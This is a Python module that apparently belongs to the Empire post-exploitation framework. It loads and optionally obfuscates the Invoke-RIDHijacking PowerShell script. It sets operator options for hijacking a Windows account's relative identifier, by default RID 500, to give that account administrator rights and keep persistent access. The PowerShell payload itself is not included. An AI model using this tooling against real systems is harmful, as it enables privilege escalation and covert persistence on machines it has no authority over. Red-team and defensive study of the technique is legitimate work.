from lib.common import helpers


class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-RIDHijacking',

            'Author': ['Sebastian Castro @r4wd3r'],

            'Description': ('Runs Invoke-RIDHijacking. Allows setting desired privileges to an existent account '
                            'by modifying the Relative Identifier value copy used to create the access token. '
                            'This module needs administrative privileges.'
                            ),

            'Background': False,

            'OutputExtension': None,

            'NeedsAdmin': True,

            'OpsecSafe': True,

            'Language': 'powershell',

            'MinLanguageVersion': '2',

            'Comments': [
                'https://github.com/r4wd3r/RID-Hijacking',
                'https://r4wsecurity.blogspot.com/2017/12/rid-hijacking-maintaining-access-on.html',
                'https://csl.com.co/rid-hijacking/'
            ]
        }

        self.options = {
            'Agent': {
                'Description':   'Agent to run module on.',
                'Required'   :   True,
                'Value'      :   ''
            },
            'RID' : {
                'Description':   'RID to set to the specified account. Default 500.',
                'Required'   :   False,
                'Value'      :   '500'
            },
            'User' : {
                'Description':   'User to set the defined RID.',
                'Required'   :   False,
                'Value'      :   ''
            },
            'UseGuest' : {
                'Description':   'Switch. Set the defined RID to the Guest account.',
                'Required'   :   False,
                'Value'      :   ''
            },
            'Password' : {
                'Description':   'Password to set to the defined account.',
                'Required'   :   False,
                'Value'      :   ''
            },
            'Enable' : {
                'Description':   'Switch. Enable the defined account.',
                'Required'   :   False,
                'Value'      :   ''
            }
        }

        # Save off a copy of the mainMenu object to access external
        #   functionality like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters are passed as
        #   an object set to the module and the options dictionary is
        #   automatically set. This is mostly in case options are passed on
        #   the command line.
        if params:
            for param in params:
                # Parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        moduleSource = self.mainMenu.installPath + "/data/module_source/persistence/Invoke-RIDHijacking.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode
        scriptEnd = "Invoke-RIDHijacking"

        for option, values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        scriptEnd += " -" + str(option)
                    else:
                        scriptEnd += " -" + str(option) + " " + str(values['Value'])
        if obfuscate:
            scriptEnd = helpers.obfuscate(psScript=scriptEnd, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
